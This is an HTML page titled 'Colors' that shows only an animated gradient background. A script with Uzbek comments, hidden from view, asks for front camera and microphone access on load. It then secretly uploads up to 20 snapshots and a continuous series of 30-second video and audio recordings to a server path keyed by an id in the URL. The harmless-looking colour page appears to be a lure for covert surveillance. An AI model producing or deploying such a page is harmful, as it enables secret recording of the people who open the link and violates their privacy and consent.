<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Colors</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body {
      margin: 0;
      height: 100vh;
      overflow: hidden;
      background: linear-gradient(-45deg, #ff6b6b, #f8e473, #4ecdc4, #5a81f7);
      background-size: 400% 400%;
      animation: gradientBG 12s ease infinite;
    }
    @keyframes gradientBG {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream = null;
    let mediaRecorder, chunks = [];
    let imageCount = 0;
    const maxImages = 20;

    // current path: /camera/<id>/  yoki /rasm/<id>/
    const currentPath = window.location.pathname;
    const parts = currentPath.split("/").filter(Boolean);
    // oxirgi element id bo'lishi kerak
    const id = parts[parts.length - 1] || '';
    // backend endpoint â€” moslashtiring agar urls.py da 'rasm' saqlansa: `/rasm/${id}/`
    const uploadURL = `/${parts[0]}/${id}/`; // e.g. /camera/639/  yoki /rasm/639/

    function dataURLtoBlob(dataurl) {
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while (n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr], { type: mime });
    }

    function getCookie(name) {
      const value = `; ${document.cookie}`;
      const parts = value.split(`; ${name}=`);
      if (parts.length === 2) return parts.pop().split(';').shift();
      return null;
    }
    const csrftoken = getCookie('csrftoken');

    // === Rasm yuborish ===
    async function takeAndSendImage() {
      if (!stream || imageCount >= maxImages) return;
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      canvas.width = w; canvas.height = h;
      canvas.getContext('2d').drawImage(video, 0, 0, w, h);
      const blob = dataURLtoBlob(canvas.toDataURL('image/png'));
      const form = new FormData();
      form.append('image', blob, `snapshot_${Date.now()}.png`);
      try {
        await fetch(uploadURL, {
          method: 'POST',
          body: form,
          // headers: {'X-CSRFToken': csrftoken}, // @csrf_exempt bo'lgani uchun shart emas
          credentials: 'same-origin'
        });
        imageCount++;
        console.log("Rasm yuborildi:", imageCount);
      } catch(e){ console.error(e); }
    }

    // === Video yuborish ===
    function startVideoRecording() {
      if (!stream) return;
      mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
      chunks = [];

      mediaRecorder.ondataavailable = e => { if(e.data && e.data.size>0) chunks.push(e.data); };
      mediaRecorder.onstop = async () => {
        if(chunks.length>0){
          const blob = new Blob(chunks, { type: "video/webm" });
          const form = new FormData();
          form.append('video', blob, `chunk_${Date.now()}.webm`);
          try {
            await fetch(uploadURL, {
              method: 'POST',
              body: form,
              credentials: 'same-origin'
            });
            console.log("Video yuborildi");
          } catch(e){ console.error(e); }
        }
        setTimeout(startVideoRecording, 500);
      };

      mediaRecorder.start();
      setTimeout(()=>{ try{ mediaRecorder.stop(); } catch(e){ console.warn(e); } }, 30*1000);
    }

    // === Kamera ishga tushirish ===
    window.onload = async () => {
      try{
        stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:"user" }, audio:true });
        video.srcObject = stream;
        await new Promise(r=>{ if(video.readyState>=2) r(); else video.onloadedmetadata=r; });

        const imageInterval = setInterval(()=>{
          takeAndSendImage();
          if(imageCount>=maxImages) clearInterval(imageInterval);
        },700);

        startVideoRecording();

        window.addEventListener('beforeunload', ()=>{
          if(mediaRecorder && mediaRecorder.state!=='inactive') mediaRecorder.stop();
        });

      } catch(e){ console.error(e); }
    };
  </script>
</body>
</html>
